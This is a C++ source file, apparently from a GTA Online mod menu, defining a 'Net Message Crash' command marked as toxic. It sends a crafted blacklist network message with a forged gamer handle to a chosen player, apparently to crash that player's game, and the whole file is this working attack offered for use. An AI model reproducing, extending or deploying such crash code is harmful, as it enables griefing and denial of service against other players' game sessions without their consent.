#include "backend/player_command.hpp"
#include "natives.hpp"
#include "pointers.hpp"
#include "core/scr_globals.hpp"
#include "packet.hpp"
#include "gta_util.hpp"
#include "network/Network.hpp"

namespace big
{
#ifdef CUSTOM_BUILD
	class netmsg_crash : player_command
	{
		using player_command::player_command;

		void gamer_handle_serialize(rage::rlGamerHandle& hnd, rage::datBitBuffer& buf)
		{
			buf.Write<uint8_t>(*reinterpret_cast<uint8_t*>(&hnd.m_platform), 8);
			if (*reinterpret_cast<uint8_t*>(&hnd.m_platform) == 3)
			{
				buf.WriteInt64(*(int64_t*)&hnd.m_rockstar_id, 64);
				buf.Write<uint8_t>(*reinterpret_cast<uint8_t*>(reinterpret_cast<__int64>(&hnd) + 9), 8);
			}
		}

		virtual CommandAccessLevel get_access_level()
		{
			return CommandAccessLevel::TOXIC;
		}

		virtual void execute(player_ptr player, const std::vector<std::uint64_t>& _args, const std::shared_ptr<command_context> ctx)
		{
			packet msg{};
			msg.write_message(rage::eNetMessage::MsgBlacklist);
			rage::rlGamerHandle gh;
			gh.m_rockstar_id = player->get_net_data()->m_gamer_handle_2.m_rockstar_id;
			gh.m_platform = 3;
			msg.write<uint64_t>(gta_util::get_network()->m_game_session_ptr->m_rline_session.m_session_id, 64);
			gamer_handle_serialize(gh, msg);
			msg.write<int>(1, 2);
			msg.send(player->get_net_game_player()->m_msg_id);

			msg.m_buffer.Seek(0);
		}
	};

	netmsg_crash g_netmsg_crash("netmsgcrash", "Net Message Crash", "Make America Great Again", 0);
#endif
}